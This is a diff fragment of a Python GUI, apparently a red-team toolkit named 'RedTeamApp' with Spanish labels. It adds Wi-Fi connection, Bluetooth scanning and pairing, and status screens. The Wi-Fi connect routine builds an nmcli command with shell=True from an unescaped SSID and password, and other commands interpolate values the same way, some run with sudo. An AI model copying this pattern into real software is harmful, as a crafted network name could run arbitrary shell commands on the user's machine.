+        else: password = None
+
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._utils_wifi_escanear_redes(iface))
+        ctk.CTkLabel(self.main_frame, text=f"CONECTANDO...", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        self.mostrar_consola()
+
+        def conectar():
+            try:
+                cmd = f"nmcli device wifi connect '{ssid}' password '{password}' ifname {iface}" if password else f"nmcli device wifi connect '{ssid}' ifname {iface}"
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                if result.returncode == 0:
+                    state_out = subprocess.check_output(f"nmcli -t -f GENERAL.STATE dev show {iface}", shell=True, text=True)
+                    estado = "ÉXITO" if "100 (connected)" in state_out else "ADVERTENCIA"
+                else: estado = f"ERROR: {result.stderr.strip()}"
+            except Exception as e: estado = f"EXCEPCIÓN: {e}"
+            self.after(0, lambda: self._utils_wifi_mostrar_resultado(estado, iface))
+        threading.Thread(target=conectar, daemon=True).start()
+
+    def _utils_wifi_mostrar_resultado(self, mensaje, iface):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
+        ctk.CTkLabel(self.main_frame, text="RESULTADO", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        ctk.CTkLabel(self.main_frame, text=mensaje, wraplength=300).pack(pady=5)
+        self.mostrar_consola()
+
+    def _utils_wifi_estado(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_utils_menu)
+        ctk.CTkLabel(self.main_frame, text="ESTADO WIFI", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        self.mostrar_consola()
+        for iface in self.obtener_interfaces_wifi(): self.ejecutar_comando(f"nmcli -t -f GENERAL.STATE,IP4.ADDRESS dev show {iface} | head -2")
+
+    # -------------------- UTILIDADES BLUETOOTH --------------------
+    def obtener_interfaces_bluetooth(self):
+        interfaces = []
+        try:
+            output = subprocess.check_output("hciconfig -a | grep 'hci'", shell=True, text=True)
+            for line in output.splitlines():
+                if "hci" in line: interfaces.append(line.split(':')[0].strip())
+        except: pass
+        return interfaces if interfaces else []
+
+    def _utils_bluetooth_seleccionar_interfaz(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_utils_menu)
+        ctk.CTkLabel(self.main_frame, text="ADAPTADOR BT", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        for iface in self.obtener_interfaces_bluetooth():
+            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                         command=lambda i=iface: self._utils_bluetooth_escanear(i)).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _utils_bluetooth_escanear(self, iface):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
+        ctk.CTkLabel(self.main_frame, text="ESCANEANDO BT...", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        self.mostrar_consola()
+
+        def escanear():
+            os.system(f"sudo hciconfig {iface} up 2>/dev/null")
+            for c in ["select", "power on", "discoverable on", "pairable on"]: os.system(f"sudo bluetoothctl -- {c} 2>/dev/null")
+            os.system(f"sudo bluetoothctl -- scan on &")
+            time.sleep(12)
+            os.system(f"sudo bluetoothctl -- scan off 2>/dev/null")
+            dispositivos = []
+            try:
+                output = subprocess.check_output(f"sudo bluetoothctl -- devices", shell=True, text=True)
+                for line in output.splitlines():
+                    if "Device" in line:
+                        parts = line.strip().split(' ', 2)
+                        if len(parts) >= 3: dispositivos.append({"mac": parts[1], "nombre": parts[2]})
+            except: pass
+            self.after(0, lambda: self._utils_bluetooth_mostrar_dispositivos(iface, dispositivos))
+        threading.Thread(target=escanear, daemon=True).start()
+
+    def _utils_bluetooth_mostrar_dispositivos(self, iface, dispositivos):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
+        ctk.CTkLabel(self.main_frame, text="DISPOSITIVOS", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for dev in dispositivos:
+            texto = f"{dev['nombre'][:15]} ({dev['mac']})"
+            ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                               command=lambda d=dev: self._utils_bluetooth_conectar(iface, d['mac'], d['nombre'])).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _utils_bluetooth_conectar(self, iface, mac, nombre):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._utils_bluetooth_escanear(iface))
+        ctk.CTkLabel(self.main_frame, text="CONECTANDO...", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        self.mostrar_consola()
+
+        def conectar():
+            try:
+                pair = subprocess.run(f"sudo bluetoothctl -- pair {mac}", shell=True, capture_output=True, text=True, timeout=30)
+                if "Pairing successful" in pair.stdout or "Paired: yes" in pair.stdout:
+                    connect = subprocess.run(f"sudo bluetoothctl -- connect {mac}", shell=True, capture_output=True, text=True, timeout=30)
+                    estado = "ÉXITO" if "Connection successful" in connect.stdout or "Connected: yes" in connect.stdout else "ERROR"
+                else: estado = "FALLO PAIR"
+            except Exception as e: estado = f"EXCEPCIÓN: {e}"
+            self.after(0, lambda: self._utils_bt_mostrar_resultado(estado))
+        threading.Thread(target=conectar, daemon=True).start()
+
+    def _utils_bt_mostrar_resultado(self, mensaje):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
+        ctk.CTkLabel(self.main_frame, text="RESULTADO", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        ctk.CTkLabel(self.main_frame, text=mensaje, wraplength=300).pack(pady=5)
+        self.mostrar_consola()
+
+    def _utils_bluetooth_estado(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_utils_menu)
+        ctk.CTkLabel(self.main_frame, text="ESTADO BT", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        self.mostrar_consola()
+        for iface in self.obtener_interfaces_bluetooth():
+            self.ejecutar_comando(f"hciconfig {iface} -a")
+
+if __name__ == "__main__":
+    app = RedTeamApp()
+    app.mainloop()
